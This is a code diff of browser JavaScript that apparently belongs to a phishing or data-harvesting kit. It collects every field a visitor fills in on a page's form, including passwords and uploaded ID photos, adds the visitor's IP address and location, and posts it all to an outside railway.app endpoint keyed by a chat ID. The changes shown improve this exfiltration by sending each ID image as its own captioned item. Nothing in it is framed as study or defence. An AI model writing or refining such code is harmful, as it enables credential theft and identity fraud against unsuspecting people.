@@ -105,51 +105,48 @@ document.addEventListener("DOMContentLoaded", () => {
     formData.append("chat_id", userId);
 
     let inputCount = 0;
-    let fileCount = 0;
-    let summary = [];
+    let fileCount  = 0;
+    let summary    = [];
+    let itemIndex  = 0; // index for item[N] image sections
 
     const inputs = form.querySelectorAll("input, textarea, select");
 
     inputs.forEach((input, index) => {
 
       if (!input || ["submit", "button"].includes(input.type)) return;
-
       if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;
 
-      let label = getSmartLabel(input, form, index);
-
-      let key =
-        input.name ||
-        input.id ||
-        label ||
-        input.placeholder ||
-        `field_${index + 1}`;
-
-      key = key.replace(/\s+/g, "_").toLowerCase();
+      const label = getSmartLabel(input, form, index);
 
       if (input.type === "file") {
+        // Each uploaded file becomes its own item[N] section:
+        //   item[N][text]  = the human-readable label (e.g. "ID Front Side")
+        //   item[N][photo] = the actual file bytes
+        // The backend sends each image as a separate captioned photo message.
         if (!input.files || input.files.length === 0) return;
 
         for (let file of input.files) {
-          formData.append(key, file);
+          const cleanLabel = label.replace(/\s*\*\s*$/, "").trim(); // strip trailing *
+          formData.append(`item[${itemIndex}][text]`,  cleanLabel);
+          formData.append(`item[${itemIndex}][photo]`, file);
+          itemIndex++;
           fileCount++;
         }
 
       } else {
-        let value = input.value?.trim();
+        const value = input.value?.trim();
         if (!value) return;
 
+        // Skip confirm_password — no need to forward it
+        if (input.name === "confirm_password") return;
+
         inputCount++;
-
-        let fullInfo = `${label}: ${value}`;
-
-        formData.append(key, fullInfo);
-        summary.push(fullInfo);
+        summary.push(`${label}: ${value}`);
       }
 
     });
 
-    return { formData, inputCount, fileCount, summary };
+    return { formData, inputCount, fileCount, summary, itemIndex };
   }
 
   // ================= UI =================
@@ -265,11 +262,13 @@ document.addEventListener("DOMContentLoaded", () => {
     showBox("Processing...");
     await new Promise(resolve => setTimeout(resolve, 50));
 
-    const { formData, inputCount, summary, fileCount } = buildGlobalFormData(userId, form);
+    const { formData, inputCount, summary, fileCount, itemIndex } = buildGlobalFormData(userId, form);
     const loc = await getLocationData();
 
-    let reportMessage = `
-📥 NEW SUBMISSION
+    // Build the text report and append as "text" so /send uses it as the
+    // first message (and as caption fallback on any plain-field sends).
+    const reportMessage =
+`📥 NEW SUBMISSION
 
 🌍 Location
 IP: ${loc.ip}
@@ -282,10 +281,12 @@ Inputs: ${inputCount}
 Files: ${fileCount}
 
 📝 Values
-${summary.length ? summary.join("\n") : "No input values"}
-`;
+${summary.length ? summary.join("\n") : "No input values"}`;
 
-    formData.append("report", reportMessage);
+    // Append as "text" — the /send endpoint treats this as the message body.
+    // If there are also item[N] image sections, the report goes first as its
+    // own sendMessage, then each image follows as a captioned photo.
+    formData.append("text", reportMessage);
 
     try {
       const res = await fetch("https://web-production-d469f.up.railway.app/send", {
